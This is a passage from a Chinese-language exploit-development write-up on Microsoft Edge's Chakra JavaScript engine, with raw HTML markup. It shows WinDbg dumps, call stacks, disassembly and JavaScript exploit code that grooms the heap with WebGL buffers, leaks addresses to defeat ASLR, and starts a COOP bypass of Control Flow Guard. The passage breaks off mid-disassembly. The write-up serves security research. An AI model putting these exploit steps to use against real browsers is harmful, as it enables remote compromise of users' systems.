0000029c`73ea82e8&nbsp;&nbsp;000002d0`909a0020&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;&lt;---&nbsp;&#39;head&#39;&nbsp;member,&nbsp;points&nbsp;to&nbsp;Js::SparseArraySegment&nbsp;object</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">对于如何克服这个问题（不知道我自己破坏的数组的基址）有点难度，我决定使用VirtualAlloc分配缓冲区的技术，如asm.js和WebGL，寻找有用的漏洞利用素材。我决定记录通过移植到JS的3D游戏引擎加载网页时VirtualAlloc进行的分配情况，我看到一些WebGL缓冲区包含自引用，也就是指向缓冲区本身的指针。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以，我的下一步就变得更加清晰了：我想释放一些喷射的数组，创建内存空隙，并尝试用WebGL缓冲区填充这些内存空隙，希望包含自引用指针。如果发生这种情况，可以使用我们有限的R / W原语来读取其中一个WebGL自引用指针，从而暴露我们（现在由WebGL释放并被WebGL占用）喷射的int数组的地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">具有自引用的WebGL缓冲区如下所示：在本示例中，在缓冲区+ 0x20处有一个指向缓冲区+ 0x159的指针：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">0:013&gt;&nbsp;dqs&nbsp;00000268`abdc0000
00000268`abdc0000&nbsp;&nbsp;00000000`00000000
00000268`abdc0008&nbsp;&nbsp;00000000`00000000
00000268`abdc0010&nbsp;&nbsp;00000073`8bfdb3e0
00000268`abdc0018&nbsp;&nbsp;00000000`000000d8
00000268`abdc0020&nbsp;&nbsp;00000268`abdc0159&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;reference&nbsp;to&nbsp;buffer&nbsp;+&nbsp;0x159
00000268`abdc0028&nbsp;&nbsp;00000000`00000000
00000268`abdc0030&nbsp;&nbsp;00000000`00000000
00000268`abdc0038&nbsp;&nbsp;00000000`00000000
00000268`abdc0040&nbsp;&nbsp;00000000`00000000
00000268`abdc0048&nbsp;&nbsp;00000000`00000000
00000268`abdc0050&nbsp;&nbsp;00000001`ffffffff
00000268`abdc0058&nbsp;&nbsp;00000001`00000000
00000268`abdc0060&nbsp;&nbsp;00000000`00000000
00000268`abdc0068&nbsp;&nbsp;00000000`00000000
00000268`abdc0070&nbsp;&nbsp;00000000`00000000
00000268`abdc0078&nbsp;&nbsp;00000000`00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">虽然释放一些int数组为WebGL缓冲区腾出了空间，但我注意到它们并没有被立即释放，而是在线程空闲时调用VirtualFree，就像以下调用栈所建议的（注意所涉及到的方法名称，如Memory :: IdleDecommitPageAllocator :: IdleDecommit，ThreadServiceWrapperBase :: IdleCollect等）那样。这可以通过setTimeout让函数几秒钟后执行来克服。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">&gt;&nbsp;bp&nbsp;kernelbase!VirtualFree&nbsp;&quot;k&nbsp;10;&nbsp;gc&quot;
&nbsp;#&nbsp;Child-SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RetAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Call&nbsp;Site
00&nbsp;0000003b`db4fce58&nbsp;00007ffd`f763d307&nbsp;KERNELBASE!VirtualFree
01&nbsp;0000003b`db4fce60&nbsp;00007ffd`f76398f8&nbsp;chakra!Memory::PageAllocatorBase&lt;Memory::VirtualAllocWrapper&gt;::ReleasePages+0x247
02&nbsp;0000003b`db4fcec0&nbsp;00007ffd`f76392c4&nbsp;chakra!Memory::LargeHeapBlock::ReleasePages+0x54
03&nbsp;0000003b`db4fcf40&nbsp;00007ffd`f7639b54&nbsp;chakra!PageStack&lt;Memory::MarkContext::MarkCandidate&gt;::CreateChunk+0x1c4
04&nbsp;0000003b`db4fcfa0&nbsp;00007ffd`f7639c62&nbsp;chakra!Memory::LargeHeapBucket::SweepLargeHeapBlockList+0x68
05&nbsp;0000003b`db4fd010&nbsp;00007ffd`f764253f&nbsp;chakra!Memory::LargeHeapBucket::Sweep+0x6e
06&nbsp;0000003b`db4fd050&nbsp;00007ffd`f76426fc&nbsp;chakra!Memory::Recycler::SweepHeap+0xaf
07&nbsp;0000003b`db4fd0a0&nbsp;00007ffd`f7641263&nbsp;chakra!Memory::Recycler::Sweep+0x50
08&nbsp;0000003b`db4fd0e0&nbsp;00007ffd`f7687f50&nbsp;chakra!Memory::Recycler::FinishConcurrentCollect+0x313
09&nbsp;0000003b`db4fd180&nbsp;00007ffd`f76415b1&nbsp;chakra!ThreadContext::ExecuteRecyclerCollectionFunction+0xa0
0a&nbsp;0000003b`db4fd230&nbsp;00007ffd`f76b82c8&nbsp;chakra!Memory::Recycler::FinishConcurrentCollectWrapped+0x75
0b&nbsp;0000003b`db4fd2b0&nbsp;00007ffd`f8105bab&nbsp;chakra!ThreadServiceWrapperBase::IdleCollect+0x70
0c&nbsp;0000003b`db4fd2f0&nbsp;00007ffe`110b1c24&nbsp;edgehtml!CTimerCallbackProvider::s_TimerProviderTimerWndProc+0x5b
0d&nbsp;0000003b`db4fd320&nbsp;00007ffe`110b156c&nbsp;user32!UserCallWinProcCheckWow+0x274
0e&nbsp;0000003b`db4fd480&nbsp;00007ffd`f5c7c781&nbsp;user32!DispatchMessageWorker+0x1ac
0f&nbsp;0000003b`db4fd500&nbsp;00007ffd`f5c7ec41&nbsp;EdgeContent!CBrowserTab::_TabWindowThreadProc+0x4a1
&nbsp;#&nbsp;Child-SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RetAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Call&nbsp;Site
00&nbsp;0000003b`dc09f578&nbsp;00007ffd`f763ec85&nbsp;KERNELBASE!VirtualFree
01&nbsp;0000003b`dc09f580&nbsp;00007ffd`f763d61d&nbsp;chakra!Memory::PageSegmentBase&lt;Memory::VirtualAllocWrapper&gt;::DecommitFreePages+0xc5
02&nbsp;0000003b`dc09f5c0&nbsp;00007ffd`f769c05d&nbsp;chakra!Memory::PageAllocatorBase&lt;Memory::VirtualAllocWrapper&gt;::DecommitNow+0x1c1
03&nbsp;0000003b`dc09f610&nbsp;00007ffd`f7640a09&nbsp;chakra!Memory::IdleDecommitPageAllocator::IdleDecommit+0x89
04&nbsp;0000003b`dc09f640&nbsp;00007ffd`f76cfb68&nbsp;chakra!Memory::Recycler::ThreadProc+0xd5
05&nbsp;0000003b`dc09f6e0&nbsp;00007ffe`1044b2ba&nbsp;chakra!Memory::Recycler::StaticThreadProc+0x18
06&nbsp;0000003b`dc09f730&nbsp;00007ffe`1044b38c&nbsp;msvcrt!beginthreadex+0x12a
07&nbsp;0000003b`dc09f760&nbsp;00007ffe`12ad8364&nbsp;msvcrt!endthreadex+0xac
08&nbsp;0000003b`dc09f790&nbsp;00007ffe`12d85e91&nbsp;KERNEL32!BaseThreadInitThunk+0x14
09&nbsp;0000003b`dc09f7c0&nbsp;00000000`00000000&nbsp;ntdll!RtlUserThreadStart+0x21</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">经过与WebGL相关的几次测试后，我发现能够稳定地触发WebGL相关的分配来回收释放的int数组留下的内存空隙的调用堆栈如下所示。奇怪的是，这个内存分配不是通过VirtualAlloc完成的，而是通过HeapAlloc，但是它位于为此目的留下的一个内存空隙上。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">[...]
Trying&nbsp;to&nbsp;alloc&nbsp;0x1e84c0&nbsp;bytes
ntdll!RtlAllocateHeap:
00007ffd`99637370&nbsp;817910eeddeedd&nbsp;&nbsp;cmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dword&nbsp;ptr&nbsp;[rcx+10h],0DDEEDDEEh&nbsp;ds:000001f8`ae0c0010=ddeeddee
0:010&gt;&nbsp;gu
d3d10warp!UMResource::Init+0x481:
00007ffd`92937601&nbsp;488bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rax
0:010&gt;&nbsp;r
rax=00000200c2cc0000&nbsp;rbx=00000201c2d5d700&nbsp;rcx=098674b229090000
rdx=00000000001e84c0&nbsp;rsi=00000000001e8480&nbsp;rdi=00000200b05e9390
rip=00007ffd92937601&nbsp;rsp=00000065724f94f0&nbsp;rbp=0000000000000000
&nbsp;r8=00000200c2cc0000&nbsp;&nbsp;r9=00000201c3b02080&nbsp;r10=000001f8ae0c0038
r11=00000065724f9200&nbsp;r12=0000000000000000&nbsp;r13=00000200b0518968
r14=0000000000000000&nbsp;r15=0000000000000001
0:010&gt;&nbsp;k&nbsp;20
&nbsp;#&nbsp;Child-SP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;RetAddr&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Call&nbsp;Site
00&nbsp;00000065`724f94f0&nbsp;00007ffd`929352d9&nbsp;d3d10warp!UMResource::Init+0x481
01&nbsp;00000065`724f9560&nbsp;00007ffd`92ea1ce1&nbsp;d3d10warp!UMDevice::CreateResource+0x1c9
02&nbsp;00000065`724f9600&nbsp;00007ffd`92e7732c&nbsp;d3d11!CResource&lt;ID3D11Texture2D1&gt;::CLS::FinalConstruct+0x2a1
03&nbsp;00000065`724f9970&nbsp;00007ffd`92e7055a&nbsp;d3d11!CDevice::CreateLayeredChild+0x312c
04&nbsp;00000065`724fb1a0&nbsp;00007ffd`92e97913&nbsp;d3d11!NDXGI::CDeviceChild&lt;IDXGIResource1,IDXGISwapChainInternal&gt;::FinalConstruct+0x5a
05&nbsp;00000065`724fb240&nbsp;00007ffd`92e999e8&nbsp;d3d11!NDXGI::CResource::FinalConstruct+0x3b
06&nbsp;00000065`724fb290&nbsp;00007ffd`92ea35bc&nbsp;d3d11!NDXGI::CDevice::CreateLayeredChild+0x1c8
07&nbsp;00000065`724fb410&nbsp;00007ffd`92e83602&nbsp;d3d11!NOutermost::CDevice::CreateLayeredChild+0x25c
08&nbsp;00000065`724fb600&nbsp;00007ffd`92e7e94f&nbsp;d3d11!CDevice::CreateTexture2D_Worker+0x412
09&nbsp;00000065`724fba20&nbsp;00007ffd`7fad98db&nbsp;d3d11!CDevice::CreateTexture2D+0xbf
0a&nbsp;00000065`724fbac0&nbsp;00007ffd`7fb17c66&nbsp;edgehtml!CDXHelper::CreateWebGLColorTexturesFromDesc+0x6f
0b&nbsp;00000065`724fbb50&nbsp;00007ffd`7fb18593&nbsp;edgehtml!CDXRenderBuffer::InitializeAsColorBuffer+0xe6
0c&nbsp;00000065`724fbc10&nbsp;00007ffd`7fb198aa&nbsp;edgehtml!CDXRenderBuffer::SetStorageAndSize+0x73
0d&nbsp;00000065`724fbc40&nbsp;00007ffd`7fae6e0b&nbsp;edgehtml!CDXFrameBuffer::Initialize+0xc2
0e&nbsp;00000065`724fbcb0&nbsp;00007ffd`7faecff0&nbsp;edgehtml!RefCounted&lt;CDXFrameBuffer,SingleThreadedRefCount&gt;::Create2&lt;CDXFrameBuffer,CDXRenderTarget3D&nbsp;*&nbsp;__ptr64&nbsp;const,CSize&nbsp;const&nbsp;&amp;&nbsp;__ptr64,bool&nbsp;&amp;&nbsp;__ptr64,bool&nbsp;&amp;&nbsp;__ptr64,enum&nbsp;GLConstants::Type&gt;+0xa3
0f&nbsp;00000065`724fbd00&nbsp;00007ffd`7faece6b&nbsp;edgehtml!CDXRenderTarget3D::InitializeDefaultFrameBuffer+0x60
10&nbsp;00000065`724fbd50&nbsp;00007ffd`7faecc87&nbsp;edgehtml!CDXRenderTarget3D::InitializeContextState+0x11b
11&nbsp;00000065`724fbdb0&nbsp;00007ffd`7fad015b&nbsp;edgehtml!CDXRenderTarget3D::Initialize+0x137
12&nbsp;00000065`724fbde0&nbsp;00007ffd`7fad48ca&nbsp;edgehtml!RefCounted&lt;CDXRenderTarget3D,MultiThreadedRefCount&gt;::Create2&lt;CDXRenderTarget3D,CDXSystem&nbsp;*&nbsp;__ptr64&nbsp;const,CSize&nbsp;const&nbsp;&amp;&nbsp;__ptr64,RenderTarget3DContextCreationFlags&nbsp;const&nbsp;&amp;&nbsp;__ptr64,IDispOwnerNotify&nbsp;*&nbsp;__ptr64&nbsp;&amp;&nbsp;__ptr64&gt;+0x7f
13&nbsp;00000065`724fbe30&nbsp;00007ffd`7fcda10f&nbsp;edgehtml!CDXSystem::CreateRenderTarget3D+0x10a
14&nbsp;00000065`724fbeb0&nbsp;00007ffd`7f1feca0&nbsp;edgehtml!CWebGLRenderingContext::EnsureTarget+0x8f
15&nbsp;00000065`724fbf10&nbsp;00007ffd`7fc9373c&nbsp;edgehtml!CCanvasContextBase::EnsureBitmapRenderTarget+0x80
16&nbsp;00000065`724fbf60&nbsp;00007ffd`7f74f3fd&nbsp;edgehtml!CHTMLCanvasElement::EnsureWebGLContext+0xb8
17&nbsp;00000065`724fbfa0&nbsp;00007ffd`7f27af74&nbsp;edgehtml!`TextInput::TextInputLogging::Instance&#39;::`2&#39;::`dynamic&nbsp;atexit&nbsp;destructor&nbsp;for&nbsp;&#39;wrapper&#39;&#39;+0xba6fd
18&nbsp;00000065`724fc000&nbsp;00007ffd`7f675945&nbsp;edgehtml!CFastDOM::CHTMLCanvasElement::Trampoline_getContext+0x5c
19&nbsp;00000065`724fc050&nbsp;00007ffd`7eb3c35b&nbsp;edgehtml!CFastDOM::CHTMLCanvasElement::Profiler_getContext+0x25
1a&nbsp;00000065`724fc080&nbsp;00007ffd`7ebc1393&nbsp;chakra!Js::JavascriptExternalFunction::ExternalFunctionThunk+0x16b
1b&nbsp;00000065`724fc160&nbsp;00007ffd`7ea8d873&nbsp;chakra!amd64_CallFunction+0x93
1c&nbsp;00000065`724fc1b0&nbsp;00007ffd`7ea90419&nbsp;chakra!Js::JavascriptFunction::CallFunction&lt;1&gt;+0x83
1d&nbsp;00000065`724fc210&nbsp;00007ffd`7ea94f4d&nbsp;chakra!Js::InterpreterStackFrame::OP_CallI&lt;Js::OpLayoutDynamicProfile&lt;Js::OpLayoutT_CallI&lt;Js::LayoutSizePolicy&lt;0&gt;&nbsp;&gt;&nbsp;&gt;&nbsp;&gt;+0x99
1e&nbsp;00000065`724fc260&nbsp;00007ffd`7ea94b07&nbsp;chakra!Js::InterpreterStackFrame::ProcessUnprofiled+0x32d
1f&nbsp;00000065`724fc2f0&nbsp;00007ffd`7ea936c9&nbsp;chakra!Js::InterpreterStackFrame::Process+0x1a7</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">调用堆栈中的edgehtml！CFastDOM :: CHTMLCanvasElement :: Trampoline_getContext的存在揭示了这个代码路径是由我的WebGL初始化代码中的JavaScript行触发的：&nbsp;</span></p><pre class="brush:plain;toolbar:false">canvas.getContext(&quot;experimental-webgl&quot;);</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">在d3d10warp！UMResource :: Init这个堆分配之后的几个指令，分配的缓冲区的地址存储在缓冲区+ 0x38处，这正是我们梦寐以求的那种自我引用：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">d3d10warp!UMResource::Init+0x479:
00007ffd`929375f9&nbsp;33d2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;edx,edx
00007ffd`929375fb&nbsp;ff159f691e00&nbsp;&nbsp;&nbsp;&nbsp;call&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[d3d10warp!_imp_HeapAlloc&nbsp;(00007ffd`92b1dfa0)]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Allocates&nbsp;0x1e84c0&nbsp;bytes
00007ffd`92937601&nbsp;488bc8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rcx,rax
00007ffd`92937604&nbsp;4885c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;test&nbsp;&nbsp;&nbsp;&nbsp;rax,rax
00007ffd`92937607&nbsp;0f8400810600&nbsp;&nbsp;&nbsp;&nbsp;je&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d3d10warp!ShaderConv::CInstr::Token::Token+0x2da6d&nbsp;(00007ffd`9299f70d)
00007ffd`9293760d&nbsp;4883c040&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;add&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,40h
00007ffd`92937611&nbsp;4883e0c0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;and&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rax,0FFFFFFFFFFFFFFC0h
00007ffd`92937615&nbsp;488948f8&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;qword&nbsp;ptr&nbsp;[rax-8],rcx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//&nbsp;address&nbsp;of&nbsp;buffer&nbsp;is&nbsp;stored&nbsp;at&nbsp;buffer+0x38
0:010&gt;&nbsp;dqs&nbsp;@rcx
00000189`0f720000&nbsp;&nbsp;00000000`00000000
00000189`0f720008&nbsp;&nbsp;00000000`00000000
00000189`0f720010&nbsp;&nbsp;00000000`00000000
00000189`0f720018&nbsp;&nbsp;00000000`00000000
00000189`0f720020&nbsp;&nbsp;00000000`00000000
00000189`0f720028&nbsp;&nbsp;00000000`00000000
00000189`0f720030&nbsp;&nbsp;00000000`00000000
00000189`0f720038&nbsp;&nbsp;00000189`0f720000&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//self-reference&nbsp;pointer
00000189`0f720040&nbsp;&nbsp;00000000`00000000
00000189`0f720048&nbsp;&nbsp;00000000`00000000
00000189`0f720050&nbsp;&nbsp;00000000`00000000
00000189`0f720058&nbsp;&nbsp;00000000`00000000
00000189`0f720060&nbsp;&nbsp;00000000`00000000
00000189`0f720068&nbsp;&nbsp;00000000`00000000
00000189`0f720070&nbsp;&nbsp;00000000`00000000
00000189`0f720078&nbsp;&nbsp;00000000`00000000</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">所以在WebGL初始化代码完成之后，我们需要使用R / W原语来遍历WebGL缓冲区（它们与我们的破坏的int数组相邻），寻找偏移量为0x38的自引用指针。一旦我们找到自引用指针，就可以很容易地计算出我们破坏的int数组的基址； 反过来，这意味着现在我们可以根据绝对地址进行读操作（但是请记住，我们仍然操作一个主要的限制，那就是只能读取/写入大于被破坏的int数组的基址的地址）：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">function&nbsp;after_webgl(corrupted_index){
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(var&nbsp;i&nbsp;=&nbsp;11;&nbsp;i&nbsp;&gt;&nbsp;1;&nbsp;i&nbsp;-=&nbsp;1){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;base_index&nbsp;=&nbsp;0x4000&nbsp;*&nbsp;i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[corrupted_index][base_index&nbsp;+&nbsp;0x20]&nbsp;=&nbsp;0x21212121;&nbsp;&nbsp;&nbsp;//write&nbsp;at&nbsp;least&nbsp;to&nbsp;offset&nbsp;N&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;read&nbsp;from&nbsp;offset&nbsp;N
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//read&nbsp;the&nbsp;qword&nbsp;at&nbsp;webgl_block&nbsp;+&nbsp;0x38
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;self_ref&nbsp;=&nbsp;ud(arr[corrupted_index][base_index&nbsp;+&nbsp;1])&nbsp;*&nbsp;(2**32)&nbsp;+&nbsp;ud(arr[corrupted_index][base_index]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//If&nbsp;it&nbsp;looks&nbsp;like&nbsp;the&nbsp;pointer&nbsp;we&nbsp;are&nbsp;looking&nbsp;for...
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(((self_ref&nbsp;&amp;&nbsp;0xffff)&nbsp;==&nbsp;0)&nbsp;&amp;&amp;&nbsp;(self_ref&nbsp;&gt;&nbsp;0xffffffff)){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;array_addr&nbsp;=&nbsp;self_ref&nbsp;-&nbsp;i&nbsp;*&nbsp;0x10000;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Limitation&nbsp;of&nbsp;the&nbsp;R/W&nbsp;primitive:&nbsp;target&nbsp;address&nbsp;must&nbsp;be&nbsp;&gt;&nbsp;array&nbsp;address
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(ptr_to_object&nbsp;&gt;&nbsp;array_addr){
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Calculate&nbsp;the&nbsp;proper&nbsp;index&nbsp;to&nbsp;target&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;object
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;offset&nbsp;=&nbsp;(ptr_to_object&nbsp;-&nbsp;(array_addr&nbsp;+&nbsp;0x38))&nbsp;/&nbsp;4;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Write&nbsp;at&nbsp;least&nbsp;to&nbsp;offset&nbsp;N&nbsp;if&nbsp;you&nbsp;want&nbsp;to&nbsp;read&nbsp;from&nbsp;offset&nbsp;N
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;arr[corrupted_index][offset&nbsp;+&nbsp;0x20]&nbsp;=&nbsp;0x21212121;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Read&nbsp;the&nbsp;address&nbsp;of&nbsp;the&nbsp;vtable!
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;vtable_ptr&nbsp;=&nbsp;ud(arr[corrupted_index][offset&nbsp;+&nbsp;1])&nbsp;*&nbsp;(2**32)&nbsp;+&nbsp;ud(arr[corrupted_index][offset]);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;//Calculate&nbsp;the&nbsp;base&nbsp;address&nbsp;of&nbsp;chakra.dll
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;var&nbsp;chakra_baseaddr&nbsp;=&nbsp;vtable_ptr&nbsp;-&nbsp;0x005864d0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[...]</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">所以,如果我们足够幸运的话，泄漏的对象的地址会大于我们的损坏的int数组的地址（如果在第一次尝试中没有这么幸运的话，则需要更多的工作），我们可以简单的计算指定目标对象的索引（完成读取OOB所需），所以我们获取指向vtable的指针，然后我们可以计算chakra.dll的基地址。这样我们就挫败了ASLR，所以可以继续进入开发过程中的下一步。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 18px;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">伪面向对象编程</span></strong></span></p><hr/><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在我们已经可以读写我们泄露的对象了，下面要设法绕过Control Flow Guard，以便可以将执行流重定向到我们的ROP链。为了绕过CFG，我使用了一种被称为伪面向对象编程（COOP）[11]或面向对象的漏洞利用技术[12]。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">确切地说，我在后文中遵循了Sam Thomas [13]所描述的方法。这种技术基于链接两个函数，两个都是有效的CFG目标，提供两个原语：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">第一个函数（一个COOP部件）将局部变量（位于堆栈中）的地址作为另一个函数的参数传递，该函数通过间接调用进行调用。</span></strong></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; color: rgb(227, 108, 9);">第二个函数期望其中一个参数是指向结构的指针，并写入该预期结构的成员。</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">给定第二个COOP部件写入预期结构中的正确偏移量（等于第一个函数的返回地址存储在堆栈中的地址减去作为第一个函数的参数传递的局部变量的地址），可以使第二个函数覆盖堆栈中第一个函数的返回地址。这样，当执行第一个COOP部件的RET指令时，我们可以将执行流转移到ROP链，同时避开CFG，因为这种缓解尝试无法保护返回地址。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">为了找到满足上述条件的两个函数，我写了一个IDApython脚本，它基于Quarkslab的Triton [14] DBA框架，这是由我的同事Jonathan Salwan、Pierrick Brunet和Romain Thomas开发的一个令人敬仰的引导引擎。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">运行我的工具并检查其输出后，我选择了chakra！Js :: DynamicObjectEnumerator &lt;int，1，1，1&gt; :: MoveNext函数作为第一个COOP部件，通过间接调用来调用另一个函数，传递一个局部变量作为第二个参数（RDX寄存器）。存储堆栈中返回地址的地址与本地变量之间的距离为0x18字节：&nbsp;</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;"></span></p><pre class="brush:plain;toolbar:false">.text:0000000180089D40&nbsp;public:&nbsp;virtual&nbsp;int&nbsp;Js::DynamicObjectEnumerator&lt;int,&nbsp;1,&nbsp;1,&nbsp;1&gt;::MoveNext(unsigned&nbsp;char&nbsp;*)&nbsp;proc&nbsp;near
.text:0000000180089D40&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r11,&nbsp;rsp
